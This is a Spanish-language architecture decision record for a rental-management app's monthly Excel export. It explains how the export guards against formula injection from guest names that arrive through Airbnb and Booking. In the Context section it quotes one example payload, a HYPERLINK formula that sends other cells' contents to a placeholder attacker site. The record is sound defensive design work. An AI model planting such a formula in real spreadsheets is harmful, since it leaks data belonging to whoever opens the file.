# ADR 0007 — Exportación a Excel (`.xlsx`) sin inyección de fórmulas

- **Estado:** Aceptada
- **Fecha:** 2026-10-29

## Contexto

El Dashboard permite descargar una planilla del mes para la contabilidad (SPEC §3.8): reservas, pagos y servicios.
La familia la abre en el iPhone y la persona que lleva la contabilidad la abre en Excel.

Parte de lo que va en la planilla **no lo escribe la familia**: el nombre del huésped de una reserva de Airbnb o
Booking lo escribe el propio huésped al reservar, y llega a la app por Beds24. Es **entrada no confiable**.

Eso abre la puerta a la **inyección de fórmulas** (*formula injection* o *CSV injection*, documentada por OWASP):
si el texto de una celda empieza con `=`, `+`, `-` o `@` (también tabulador o retorno de carro), una planilla
puede interpretarlo como **fórmula** y ejecutarla al abrir el archivo. Un huésped que se registra con el nombre
`=HYPERLINK("https://sitio-del-atacante/?d="&D2,"Ver detalle")` deja en la planilla un enlace que, al tocarlo,
envía a un servidor externo el contenido de otras celdas. Funciones como `WEBSERVICE` o, en versiones antiguas de
Excel, DDE, agravan el riesgo. La víctima no es la app: es quien abre la planilla.

## Decisión

1. **Formato `.xlsx`, no CSV.** El Excel en español de Chile espera `;` como separador y coma decimal: un CSV
   estándar se abre con las columnas corridas y los montos mal leídos, y necesita BOM para las tildes. Además,
   en un CSV *todo* es texto que Excel vuelve a interpretar, así que la inyección es más fácil.
2. **Librería `openpyxl`** (Python puro, sin dependencias nativas). Escribe y también **lee** `.xlsx`, lo que
   permite probar en los tests lo que realmente quedó en el archivo. Se confirma al implementar (CLAUDE.md:
   preguntar antes de agregar una dependencia).
3. **Todo texto se escribe como texto, nunca como fórmula.** `openpyxl` convierte en fórmula cualquier valor que
   empiece con `=`. La exportación pasa por **una sola función** que escribe cada celda:
   - números (montos CLP) como enteros y fechas como fechas de Excel;
   - cualquier otro valor como **cadena de tipo texto** (`data_type = "s"`), aunque empiece con `=`, `+`, `-`,
     `@`, tabulador o retorno de carro;
   - en esas celdas peligrosas, además, el estilo `quotePrefix` (el apóstrofo invisible de Excel), para que si
     alguien edita la celda y presiona Enter tampoco se convierta en fórmula.
   La planilla **no contiene ninguna fórmula**: los totales se calculan en el servidor.
4. **Minimización y control** (SPEC §6): sin teléfonos, emails ni comprobantes; solo usuarios autenticados;
   el archivo se genera en memoria y no se guarda en disco; el nombre del archivo lo arma el servidor
   (`valle-petra-AAAA-MM.xlsx`), nunca con datos del usuario; cada descarga queda en `RegistroAuditoria`.

## Alternativas consideradas

| Opción | A favor | Por qué no |
|---|---|---|
| CSV con la librería estándar | Sin dependencias | Se abre mal en Excel en español (separador y decimales), problemas de tildes, y es el formato más expuesto a la inyección |
| CSV con apóstrofo delante de los textos peligrosos (mitigación de OWASP) | Sin dependencias | Arregla la inyección pero no el separador ni las tildes; el apóstrofo queda visible en otros programas |
| `XlsxWriter` | Rápida, buena documentación | Solo escribe (los tests no podrían leer el archivo con la misma librería) y por defecto también convierte en fórmula los textos que empiezan con `=` (`strings_to_formulas`) |
| `pandas` | Exporta con una línea | Dependencia muy pesada para cuatro hojas, y no controla celda por celda el tipo de dato |

## Consecuencias

- ✅ La contabilidad recibe una planilla que se abre bien, con montos y fechas que se pueden sumar y ordenar.
- ✅ Un nombre malicioso llegado desde Airbnb o Booking se ve como texto, no se ejecuta.
- ✅ Defensa en profundidad: aunque una validación de entrada falle (el nombre de una reserva directa ya no admite
  símbolos, pero los de Airbnb/Booking no pasan por ese formulario), la exportación es segura por sí misma.
- 🧪 **Tests obligatorios:** por cada prefijo peligroso (`=`, `+`, `-`, `@`, tabulador, retorno de carro) se
  crea una reserva con ese nombre, se genera la planilla, se vuelve a abrir con `openpyxl` y se verifica que la
  celda es de tipo texto, conserva el valor original y que el libro no tiene ninguna fórmula.
- 🔎 **Detección (Blue Team):** cada exportación genera un evento de auditoría que llega a Wazuh. Una regla puede
  alertar si un mismo usuario descarga muchos meses en poco tiempo (posible extracción masiva de datos).
- ⚠️ Una dependencia más que mantener al día (`openpyxl`), vigilada como el resto en CI.
- 🔁 Revisar si la contabilidad pide otro formato (por ejemplo, el que exija un software contable o el SII).
